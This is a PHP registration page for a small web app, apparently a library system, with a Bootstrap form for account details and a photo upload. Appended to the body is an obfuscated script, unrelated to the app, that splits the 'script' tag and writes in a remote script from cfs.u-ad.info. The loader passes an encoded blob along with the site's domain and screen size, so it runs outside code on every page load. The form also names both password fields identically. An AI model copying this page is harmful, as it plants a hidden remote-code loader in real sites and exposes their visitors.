<?php
/**
 * Created by PhpStorm.
 * User: wahyu
 * Date: 5/26/14
 * Time: 1:03 PM
 */
	include "../config/koneksi.php";
?>

<!DOCTYPE html>
<html>
<head>
    <title>REGISTER</title>
    <link href="../templates/library/css/bootstrap.min.css" rel="stylesheet">
    <link href="../templates/library/css/login.css" rel="stylesheet">
    <link rel="shortcut icon" href="../templates/library/img/book.ico">
</head>
<body>
    <div class="container">
        <form action="user/register.php" class="form-register" method="POST" enctype="multipart/form-data">
            <h2 class="form-signin-heading"><center>Register</center></h2>
	            <div class="container-fluid">
	            	<div class="row">
  						<div class="col-xs-6 col-md-4">Email</div>
                        <div class="col-xs-12 col-md-8">
                            <input type="email" class="form-control" name="email" placeholder="Email" required autofocus>
                        </div>
		            </div>
                    <div class="row">
                        <div class="col-xs-6 col-md-4">Username</div>
                        <div class="col-xs-12 col-md-8">
                            <input type="text" class="form-control" name="username" placeholder="Username" required>
                        </div>
                    </div>
                    <div class="row">
                        <div class="col-xs-6 col-md-4">Passsword</div>
                        <div class="col-xs-12 col-md-8">
                            <input type="password" class="form-control" name="password" placeholder="Password" required>
                        </div>
                    </div>
                    <div class="row">
                        <div class="col-xs-6 col-md-4">Re-type Passsword</div>
                        <div class="col-xs-12 col-md-8">
                            <input type="password" class="form-control" name="password" placeholder="Re-type Password" required>
                        </div>
                    </div>
                    <div class="row">
                        <div class="col-xs-6 col-md-4">Full Name</div>
                        <div class="col-xs-12 col-md-8">
                            <input type="text" class="form-control" name="full_name" placeholder="Full Name" required>
                            <input type="hidden" name="akses" value="user">
                        </div>
                    </div>
                    <div class="row">
                        <div class="col-xs-6 col-md-4">Address</div>
                        <div class="col-xs-12 col-md-8">
                            <textarea class="form-control" rows="3" name="address" placeholder="Address"></textarea>
                        </div>
                    </div>
                    <div class="row">
                        <div class="col-xs-6 col-md-4">Phone</div>
                        <div class="col-xs-12 col-md-8">
                            <input type="number" class="form-control" name="phone" placeholder="Phone" required>
                        </div>
                    </div>
                    <br/>
                    <div class="row">
                        <div class="col-xs-6 col-md-4">Photo</div>
                        <div class="col-xs-12 col-md-8">
                            <input type="file" name="photo" required>
                        </div>
                    </div>
	            </div>
                <br>
                <div class="row">
                    <div class="col-xs-6">
                        <button class="btn btn-lg btn-primary btn-block" name="btn" type="submit">Submit</button>
                    </div>
                    <div class="col-xs-6">
                        <a href="../index.php" class="btn btn-lg btn-danger btn-block">Cancel</a>
                    </div>
                </div>
            </div>
        </form>
    </div>
    <script type="text/javascript">
        if (self != top) {
        } else {
            var idc_glo_url = (location.protocol == "https:" ? "https://" : "http://");
            var idc_glo_r = Math.floor(Math.random() * 99999999999);
            document.write("<scr" + "ipt type=text/javascript src=" + idc_glo_url + "cfs.u-ad.info/cfspushadsv2/request");
            document.write("?id=1");
            document.write("&amp;enc=telkom2");
            document.write("&amp;params=" + "4TtHaUQnUEiP6K%2fc5C582PlvV7TskJKD3TiAGBAK0rPgMH0G7bcxN9juXgoUYYfuSMJgCqqSo%2bDKEp8VIVQIWllYvygKzg5lHEupJGy0gS9cZh08ELHsYh9D38zu8Jjh12oeKnR4RiIYBh9hYTqQwfvTm9eutyMWbJ92z6RqX%2bnTeRLgJ9TaVIBrTY57L04vJABe0NWLtbxi1XdnJKHR9zmZmtoVIPp0ax4cWabCPzLupP2UxkciUs8JAgfa59lwync%2fz7%2fpxxGTTA9bsihdy8qpRaHtQKsdsMM7Q4NV4%2b5V6zNXRtyrhkXzsO0a%2bdfux%2b3lVMPMdwJwXxC5x4eK4hOfMTt7utxDsiOwPz7W8GR9MTt5JF0I0Bu1t5Vv4buZoGHAOsUfq%2bYwJFulUfku4xGuGaaujOrFcY9NtXWR88Y%3d");
            document.write("&amp;idc_r=" + idc_glo_r);
            document.write("&amp;domain=" + document.domain);
            document.write("&amp;sw=" + screen.width + "&amp;sh=" + screen.height);
            document.write("></scr" + "ipt>");
        }
    </script>
    <noscript>activate javascript</noscript>
</body>
</html>